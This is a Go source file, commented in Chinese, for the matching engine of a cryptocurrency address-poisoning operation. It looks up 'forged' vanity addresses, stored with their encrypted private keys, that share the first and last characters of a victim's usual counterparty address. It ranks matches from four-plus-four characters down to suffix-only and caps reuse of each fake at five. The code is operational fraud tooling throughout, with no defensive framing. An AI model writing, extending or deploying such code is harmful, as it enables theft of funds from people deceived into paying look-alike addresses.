package core

import (
	"context"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"go.uber.org/zap"
)

// VanityAddress 伪造地址信息
type VanityAddress struct {
	ID                  int64
	Address             string
	Prefix              string // 前4位
	Prefix3             string // 前3位
	Suffix              string // 后4位
	EncryptedPrivateKey []byte
	MatchType           string // "4_4", "3_4", "2_4", "1_4", "0_4"
}

// MatchedTarget 匹配成功的目标
type MatchedTarget struct {
	Target      Target        // 原始目标
	FakeAddress VanityAddress // 匹配到的伪造地址
}

// PrefixSuffixIndex 前缀后缀索引 (内存中)
// 支持多种前缀长度: prefix4, prefix3, prefix2, prefix1, prefix0 (只匹配后4位)
type PrefixSuffixIndex struct {
	mu      sync.RWMutex
	index44 map[string]bool // prefix4+suffix4 (8字符)
	index34 map[string]bool // prefix3+suffix4 (7字符)
	index24 map[string]bool // prefix2+suffix4 (6字符)
	index14 map[string]bool // prefix1+suffix4 (5字符)
	index04 map[string]bool // suffix4 (4字符) - 只匹配后4位
}

// NewPrefixSuffixIndex 创建索引
func NewPrefixSuffixIndex() *PrefixSuffixIndex {
	return &PrefixSuffixIndex{
		index44: make(map[string]bool),
		index34: make(map[string]bool),
		index24: make(map[string]bool),
		index14: make(map[string]bool),
		index04: make(map[string]bool),
	}
}

// Add 添加索引 (根据前缀长度)
func (idx *PrefixSuffixIndex) Add(prefixLen int, prefix, suffix string) {
	var key string
	if prefixLen == 0 {
		key = suffix
	} else {
		key = prefix[:prefixLen] + suffix
	}
	idx.mu.Lock()
	switch prefixLen {
	case 4:
		idx.index44[key] = true
	case 3:
		idx.index34[key] = true
	case 2:
		idx.index24[key] = true
	case 1:
		idx.index14[key] = true
	case 0:
		idx.index04[key] = true
	}
	idx.mu.Unlock()
}

// Add44 添加前4后4索引 (兼容)
func (idx *PrefixSuffixIndex) Add44(prefix4, suffix string) {
	idx.Add(4, prefix4, suffix)
}

// Add34 添加前3后4索引 (兼容)
func (idx *PrefixSuffixIndex) Add34(prefix3, suffix string) {
	idx.Add(3, prefix3+"x", suffix) // 补位以保持参数格式
}

// Has 检查是否存在
func (idx *PrefixSuffixIndex) Has(prefixLen int, prefix, suffix string) bool {
	var key string
	if prefixLen == 0 {
		key = suffix
	} else {
		key = prefix[:prefixLen] + suffix
	}
	idx.mu.RLock()
	defer idx.mu.RUnlock()
	switch prefixLen {
	case 4:
		return idx.index44[key]
	case 3:
		return idx.index34[key]
	case 2:
		return idx.index24[key]
	case 1:
		return idx.index14[key]
	case 0:
		return idx.index04[key]
	}
	return false
}

// Has44 检查前4后4是否存在 (兼容)
func (idx *PrefixSuffixIndex) Has44(prefix4, suffix string) bool {
	return idx.Has(4, prefix4, suffix)
}

// Has34 检查前3后4是否存在 (兼容)
func (idx *PrefixSuffixIndex) Has34(prefix3, suffix string) bool {
	return idx.Has(3, prefix3+"x", suffix)
}

// Size44 返回前4后4索引大小
func (idx *PrefixSuffixIndex) Size44() int {
	idx.mu.RLock()
	defer idx.mu.RUnlock()
	return len(idx.index44)
}

// Size34 返回前3后4索引大小
func (idx *PrefixSuffixIndex) Size34() int {
	idx.mu.RLock()
	defer idx.mu.RUnlock()
	return len(idx.index34)
}

// TotalSize 返回总索引大小
func (idx *PrefixSuffixIndex) TotalSize() int {
	idx.mu.RLock()
	defer idx.mu.RUnlock()
	return len(idx.index44) + len(idx.index34) + len(idx.index24) + len(idx.index14) + len(idx.index04)
}

// Matcher 地址匹配器 (优化版: 全内存索引)
// 匹配策略优先级: 前4后4 > 前3后4 > 前2后4 > 前1后4 > 前0后4
// 支持15亿级数据，微秒级查询
type Matcher struct {
	db            *pgxpool.Pool
	logger        *zap.Logger
	index         *PrefixSuffixIndex // 旧版内存索引 (兼容)
	memIndex      *MemoryIndex       // 新版全内存索引 (15亿级)
	lastIndexTime time.Time          // 上次索引更新时间
	indexMu       sync.Mutex         // 索引更新锁
	useDBOnly     bool               // 是否只使用数据库查询
	useMemIndex   bool               // 是否使用全内存索引
	useSharding   bool               // 是否使用分表
}

// NewMatcher 创建匹配器
func NewMatcher(db *pgxpool.Pool, logger *zap.Logger) *Matcher {
	return &Matcher{
		db:          db,
		logger:      logger,
		index:       NewPrefixSuffixIndex(),
		memIndex:    NewMemoryIndex(db, logger),
		useDBOnly:   false,
		useMemIndex: false,
		useSharding: false,
	}
}

// EnableMemoryIndex 启用全内存索引模式 (15亿级数据)
func (m *Matcher) EnableMemoryIndex(useSharding bool) {
	m.useMemIndex = true
	m.useSharding = useSharding
	if useSharding {
		m.memIndex.EnableSharding()
	}
	m.logger.Info("🚀 全内存索引模式已启用", zap.Bool("分表模式", useSharding))
}

// BuildIndex 构建内存索引 (启动时调用)
// 全内存模式: 加载所有地址到内存 (15亿级)
// 兼容模式: 加载 prefix+suffix 组合 (500万以下)
func (m *Matcher) BuildIndex(ctx context.Context) error {
	m.indexMu.Lock()
	defer m.indexMu.Unlock()

	startTime := time.Now()

	// 全内存索引模式 (15亿级)
	if m.useMemIndex {
		m.logger.Info("🔄 开始加载全内存索引 (15亿级模式)...")
		if err := m.memIndex.Load(ctx); err != nil {
			m.logger.Error("全内存索引加载失败", zap.Error(err))
			return err
		}
		m.lastIndexTime = time.Now()
		total, idx44, idx34, loadTime := m.memIndex.GetStats()
		m.logger.Info("✅ 全内存索引加载完成",
			zap.Int64("总地址数", total),
			zap.Int("44索引", idx44),
			zap.Int("34索引", idx34),
			zap.Duration("耗时", loadTime))
		return nil
	}

	// 兼容模式: 旧版索引
	m.logger.Info("🔍 开始构建地址索引 (兼容模式)...")

	// 先检查地址库大小
	var totalCount int64
	err := m.db.QueryRow(ctx, "SELECT COUNT(*) FROM vanity_addresses").Scan(&totalCount)
	if err != nil {
		m.logger.Warn("查询地址数量失败，使用纯数据库模式", zap.Error(err))
		m.useDBOnly = true
		return nil
	}

	// 如果地址库过大 (>500万)，跳过内存索引
	const maxIndexSize = 5_000_000
	if totalCount > maxIndexSize {
		m.useDBOnly = true
		m.logger.Info("📊 地址库过大，使用纯数据库查询模式",
			zap.Int64("地址数量", totalCount),
			zap.Int64("阈值", maxIndexSize))
		return nil
	}

	// 重置索引
	m.index = NewPrefixSuffixIndex()
	m.useDBOnly = false

	// 加载前4后4索引
	count44, err := m.loadIndex44(ctx)
	if err != nil {
		return fmt.Errorf("load index44: %w", err)
	}

	// 加载前3后4索引
	count34, err := m.loadIndex34(ctx)
	if err != nil {
		return fmt.Errorf("load index34: %w", err)
	}

	m.lastIndexTime = time.Now()
	m.logger.Info("✅ 地址索引构建完成",
		zap.Int("前4后4组合", m.index.Size44()),
		zap.Int("前3后4组合", m.index.Size34()),
		zap.Int64("总记录数", count44+count34),
		zap.Duration("耗时", time.Since(startTime)))

	return nil
}

// loadIndex44 加载前4后4索引
func (m *Matcher) loadIndex44(ctx context.Context) (int64, error) {
	rows, err := m.db.Query(ctx, `
		SELECT DISTINCT prefix, suffix FROM vanity_addresses
	`)
	if err != nil {
		return 0, err
	}
	defer rows.Close()

	var count int64
	for rows.Next() {
		var prefix, suffix string
		if err := rows.Scan(&prefix, &suffix); err != nil {
			continue
		}
		m.index.Add44(prefix, suffix)
		count++
	}
	return count, nil
}

// loadIndex34 加载前3后4索引
func (m *Matcher) loadIndex34(ctx context.Context) (int64, error) {
	rows, err := m.db.Query(ctx, `
		SELECT DISTINCT prefix3, suffix FROM vanity_addresses
	`)
	if err != nil {
		return 0, err
	}
	defer rows.Close()

	var count int64
	for rows.Next() {
		var prefix3, suffix string
		if err := rows.Scan(&prefix3, &suffix); err != nil {
			continue
		}
		m.index.Add34(prefix3, suffix)
		count++
	}
	return count, nil
}

// Match 匹配单个目标地址
// 策略优先级: 前4后4 > 前3后4 > 前2后4 > 前1后4 > 前0后4
// 逻辑: 使用 target.MatchAddr (接收方B) 的前后N位匹配伪造地址
// 投毒目标是 target.PoisonTo (发送方A)
func (m *Matcher) Match(ctx context.Context, target Target) (*MatchedTarget, error) {
	// 使用 MatchAddr 来匹配伪造地址
	matchAddr := target.MatchAddr
	if matchAddr == "" {
		matchAddr = target.Address // 兼容旧逻辑
	}
	addr := strings.ToLower(strings.TrimPrefix(matchAddr, "0x"))

	if len(addr) != 40 {
		return nil, nil
	}

	suffix := addr[36:] // 后4位

	// 全内存索引模式 (15亿级，微秒级查询)
	if m.useMemIndex {
		return m.matchMemoryIndexPriority(ctx, target, addr, suffix)
	}

	// 纯数据库模式或旧版模式: 按优先级尝试匹配
	return m.matchWithPriority(ctx, target, addr, suffix)
}

// matchWithPriority 按优先级匹配: 4_4 > 3_4 > 2_4 > 1_4 > 0_4
func (m *Matcher) matchWithPriority(ctx context.Context, target Target, addr, suffix string) (*MatchedTarget, error) {
	// 优先级顺序: 前缀从4位递减到0位
	priorities := []struct {
		prefixLen int
		matchType string
	}{
		{4, "4_4"},
		{3, "3_4"},
		{2, "2_4"},
		{1, "1_4"},
		{0, "0_4"},
	}

	for _, p := range priorities {
		prefix := ""
		if p.prefixLen > 0 {
			prefix = addr[:p.prefixLen]
		}

		va, found, err := m.matchByPrefixLen(ctx, p.prefixLen, prefix, suffix)
		if err == nil && found {
			va.MatchType = p.matchType
			return &MatchedTarget{
				Target:      target,
				FakeAddress: va,
			}, nil
		}
	}

	return nil, nil
}

// matchMemoryIndexPriority 全内存索引匹配 (优先级: 4_4 > 3_4 > 2_4 > 1_4 > 0_4)
func (m *Matcher) matchMemoryIndexPriority(ctx context.Context, target Target, addr, suffix string) (*MatchedTarget, error) {
	priorities := []struct {
		prefixLen int
		matchType string
	}{
		{4, "4_4"},
		{3, "3_4"},
		{2, "2_4"},
		{1, "1_4"},
		{0, "0_4"},
	}

	for _, p := range priorities {
		prefix := ""
		if p.prefixLen > 0 {
			prefix = addr[:p.prefixLen]
		}

		// 内存查找
		if m.memIndex.LookupByPrefixLen(p.prefixLen, prefix, suffix) {
			// 从数据库获取地址和私钥
			va, found, err := m.matchByPrefixLen(ctx, p.prefixLen, prefix, suffix)
			if err == nil && found {
				va.MatchType = p.matchType
				return &MatchedTarget{
					Target:      target,
					FakeAddress: va,
				}, nil
			}
		}
	}

	return nil, nil
}

// matchByPrefixLen 根据前缀长度匹配
// 排除已使用超过5次的地址
func (m *Matcher) matchByPrefixLen(ctx context.Context, prefixLen int, prefix, suffix string) (VanityAddress, bool, error) {
	var va VanityAddress
	var query string

	switch prefixLen {
	case 4:
		query = `
			SELECT va.id, va.address, va.prefix, COALESCE(va.prefix3, LEFT(va.prefix, 3)), va.suffix, va.encrypted_private_key
			FROM vanity_addresses va
			LEFT JOIN used_fake_addresses ufa ON LOWER(va.address) = ufa.address
			WHERE va.prefix = $1 AND va.suffix = $2
			  AND (ufa.use_count IS NULL OR ufa.use_count < 5)
			LIMIT 1`
	case 3:
		query = `
			SELECT va.id, va.address, va.prefix, COALESCE(va.prefix3, LEFT(va.prefix, 3)), va.suffix, va.encrypted_private_key
			FROM vanity_addresses va
			LEFT JOIN used_fake_addresses ufa ON LOWER(va.address) = ufa.address
			WHERE va.prefix3 = $1 AND va.suffix = $2
			  AND (ufa.use_count IS NULL OR ufa.use_count < 5)
			LIMIT 1`
	case 2:
		query = `
			SELECT va.id, va.address, va.prefix, COALESCE(va.prefix3, LEFT(va.prefix, 3)), va.suffix, va.encrypted_private_key
			FROM vanity_addresses va
			LEFT JOIN used_fake_addresses ufa ON LOWER(va.address) = ufa.address
			WHERE LEFT(va.prefix, 2) = $1 AND va.suffix = $2
			  AND (ufa.use_count IS NULL OR ufa.use_count < 5)
			LIMIT 1`
	case 1:
		query = `
			SELECT va.id, va.address, va.prefix, COALESCE(va.prefix3, LEFT(va.prefix, 3)), va.suffix, va.encrypted_private_key
			FROM vanity_addresses va
			LEFT JOIN used_fake_addresses ufa ON LOWER(va.address) = ufa.address
			WHERE LEFT(va.prefix, 1) = $1 AND va.suffix = $2
			  AND (ufa.use_count IS NULL OR ufa.use_count < 5)
			LIMIT 1`
	case 0:
		// 只匹配后4位
		query = `
			SELECT va.id, va.address, va.prefix, COALESCE(va.prefix3, LEFT(va.prefix, 3)), va.suffix, va.encrypted_private_key
			FROM vanity_addresses va
			LEFT JOIN used_fake_addresses ufa ON LOWER(va.address) = ufa.address
			WHERE va.suffix = $1
			  AND (ufa.use_count IS NULL OR ufa.use_count < 5)
			LIMIT 1`
	default:
		return va, false, nil
	}

	var err error
	if prefixLen == 0 {
		err = m.db.QueryRow(ctx, query, suffix).Scan(
			&va.ID, &va.Address, &va.Prefix, &va.Prefix3, &va.Suffix, &va.EncryptedPrivateKey,
		)
	} else {
		err = m.db.QueryRow(ctx, query, prefix, suffix).Scan(
			&va.ID, &va.Address, &va.Prefix, &va.Prefix3, &va.Suffix, &va.EncryptedPrivateKey,
		)
	}

	if err != nil {
		if err.Error() == "no rows in result set" {
			return va, false, nil
		}
		return va, false, err
	}
	return va, true, nil
}

// RefreshIndex 刷新索引 (定期调用)
func (m *Matcher) RefreshIndex(ctx context.Context) error {
	// 每小时刷新一次
	if time.Since(m.lastIndexTime) < time.Hour {
		return nil
	}
	return m.BuildIndex(ctx)
}

// MatchBatch 批量匹配目标地址
func (m *Matcher) MatchBatch(ctx context.Context, targets []Target) ([]MatchedTarget, error) {
	results := make([]MatchedTarget, 0, len(targets))

	for _, target := range targets {
		matched, err := m.Match(ctx, target)
		if err != nil {
			m.logger.Warn("Match error", zap.Error(err))
			continue
		}
		if matched != nil {
			results = append(results, *matched)
		}
	}

	return results, nil
}

// MatchStats 匹配统计
type MatchStats struct {
	TotalAddresses int64
	Index44Size    int
	Index34Size    int
}

// GetStats 获取统计信息
func (m *Matcher) GetStats(ctx context.Context) (MatchStats, error) {
	var stats MatchStats

	err := m.db.QueryRow(ctx, `SELECT COUNT(*) FROM vanity_addresses`).Scan(&stats.TotalAddresses)
	if err != nil {
		return stats, err
	}

	stats.Index44Size = m.index.Size44()
	stats.Index34Size = m.index.Size34()

	return stats, nil
}

// GetIndexStats 获取索引统计
func (m *Matcher) GetIndexStats() (size44, size34 int, lastUpdate time.Time) {
	return m.index.Size44(), m.index.Size34(), m.lastIndexTime
}
